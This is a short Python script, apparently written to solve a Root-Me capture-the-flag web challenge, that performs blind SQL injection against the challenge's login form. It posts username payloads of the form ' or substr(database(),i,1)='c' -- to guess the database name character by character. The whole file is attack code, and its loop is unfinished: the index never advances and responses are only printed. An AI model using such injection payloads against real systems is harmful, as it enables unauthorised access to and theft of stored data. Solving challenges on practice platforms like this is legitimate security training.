import requests

url = 'http://challenge01.root-me.org/web-serveur/ch10/'

username = ''
password = ''
payload = ''
i = 1

while True:
    for ch in 'abcdefghijklnmopqrstuvwxyz1234567890!@#$%^&*()':
        payload = 'aa\' or substr(database(),{0}, 1)=\'{1}\' -- '.format(i, ch)
        params = {'username' : payload, 'password' : 'test'}

        res = requests.post(url, data = params)
        print res.text
    

